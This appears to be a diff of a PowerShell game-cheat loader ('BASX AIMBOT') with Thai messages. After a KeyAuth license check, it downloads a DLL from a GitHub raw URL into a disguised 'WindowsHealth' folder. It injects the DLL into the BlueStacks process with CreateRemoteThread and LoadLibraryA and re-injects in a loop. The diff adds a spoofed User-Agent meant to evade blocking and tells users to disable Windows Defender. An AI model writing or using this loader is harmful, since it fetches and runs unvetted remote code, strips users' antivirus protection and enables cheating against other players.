@@ -1,3 +1,5 @@
+# ตั้งค่าให้รองรับภาษาไทยและโปรโตคอลความปลอดภัย
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # --- ข้อมูล KeyAuth ---
@@ -8,7 +10,7 @@ $Version = "1.0"
 
 $dirPath    = "$env:LOCALAPPDATA\WindowsHealth"
 $configPath = "$dirPath\auth.dat"
-$targetDll  = "$env:TEMP\AimbotFemaleFix.dll"
+$targetDll  = "$dirPath\AimbotFemaleFix.dll" # ย้ายมาเก็บในโฟลเดอร์แอป
 $dllUrl     = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
 $targetProc = "HD-Player"
 
@@ -16,7 +18,7 @@ function Show-Auth {
     param($savedKey = $null)
     Clear-Host
     Write-Host "==============================" -ForegroundColor Cyan
-    Write-Host "     BASX AIMBOT SYSTEM       " -ForegroundColor Cyan
+    Write-Host "     BASX AIMBOT AI test       " -ForegroundColor Cyan
     Write-Host "==============================" -ForegroundColor Cyan
     
     $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
@@ -28,7 +30,7 @@ function Show-Auth {
 
     if ($null -ne $savedKey) { 
         $key = $savedKey 
-        Write-Host "[*] Using saved license key..." -ForegroundColor Gray
+        Write-Host "[*] กำลังใช้คีย์ที่บันทึกไว้..." -ForegroundColor Gray
     } else { 
         $key = Read-Host " Enter License Key" 
     }
@@ -53,19 +55,19 @@ if (Test-Path $configPath) { $currentKey = Get-Content $configPath }
 if (Show-Auth -savedKey $currentKey) {
     Write-Host "[+] Login Success!" -ForegroundColor Green
 
-    # --- ระบบดาวน์โหลดใหม่ (เช็คไฟล์ก่อนโหลด) ---
+    # --- ระบบดาวน์โหลด (เพิ่ม User-Agent เพื่อหลบการบล็อก) ---
     if (!(Test-Path $targetDll)) {
-        Write-Host "[*] Downloading components..." -ForegroundColor Yellow
+        Write-Host "[*] กำลังดาวน์โหลดไฟล์คอมโพเนนต์..." -ForegroundColor Yellow
         try {
-            Invoke-WebRequest -Uri $dllUrl -OutFile $targetDll -ErrorAction Stop
-            Write-Host "[+] Download Complete." -ForegroundColor Green
+            $client = New-Object System.Net.WebClient
+            $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            $client.DownloadFile($dllUrl, $targetDll)
+            Write-Host "[+] ดาวน์โหลดสำเร็จ" -ForegroundColor Green
         } catch { 
-            Write-Host "[!] Download Failed! Check your internet or link." -ForegroundColor Red
-            Write-Host "[*] ตรวจสอบว่าปิด Antivirus หรือยัง?" -ForegroundColor Yellow
+            Write-Host "[!] ดาวน์โหลดล้มเหลว!" -ForegroundColor Red
+            Write-Host "[!] โปรดปิด Windows Defender / Antivirus แล้วลองใหม่" -ForegroundColor Yellow
             exit 
         }
-    } else {
-        Write-Host "[*] Component already exists. Skipping download." -ForegroundColor Gray
     }
 
     $Source = @"
@@ -83,18 +85,18 @@ if (Show-Auth -savedKey $currentKey) {
         [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
         
         public static void StartNode(string path, int pid) {
-            IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
-            if (hProc == IntPtr.Zero) return;
-            IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
-            IntPtr outSize;
-            WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out outSize);
-            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-            CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+            IntPtr h = OpenProcess(0x001F0FFF, false, pid);
+            if (h == IntPtr.Zero) return;
+            IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
+            IntPtr w;
+            WriteProcessMemory(h, a, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out w);
+            IntPtr l = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+            CreateRemoteThread(h, IntPtr.Zero, 0, l, a, 0, IntPtr.Zero);
         }
 
         public static bool CheckMemory(int pid, long addr) {
             IntPtr h = OpenProcess(0x001F0FFF, false, pid);
-            if (h == IntPtr.Zero) return true; // ถ้าเปิดไม่ได้ให้ถือว่ายังอยู่ไปก่อน
+            if (h == IntPtr.Zero) return true;
             byte[] b = new byte[4];
             int r;
             if (ReadProcessMemory(h, (IntPtr)addr, b, 4, out r)) {
@@ -106,15 +108,14 @@ if (Show-Auth -savedKey $currentKey) {
 "@
     Add-Type -TypeDefinition $Source
 
-    Write-Host "[*] Monitoring $targetProc..." -ForegroundColor Cyan
+    Write-Host "[*] กำลังตรวจจับ $targetProc..." -ForegroundColor Cyan
     while ($true) {
         $p = Get-Process $targetProc -ErrorAction SilentlyContinue
         if ($p) {
-            # ตรวจสอบค่าที่ 0x2EC ถ้าค่าหลุด ให้ฉีดใหม่
             if (![NodeHandler]::CheckMemory($p.Id, 0x2EC)) {
                 if (Test-Path $targetDll) {
                     [NodeHandler]::StartNode($targetDll, $p.Id)
-                    Write-Host "[+] $(Get-Date -Format 'HH:mm:ss') - Re-Injected Successfully!" -ForegroundColor Green
+                    Write-Host "[+] $(Get-Date -Format 'HH:mm:ss') - ฉีดไฟล์สำเร็จ!" -ForegroundColor Green
                 }
             }
         }
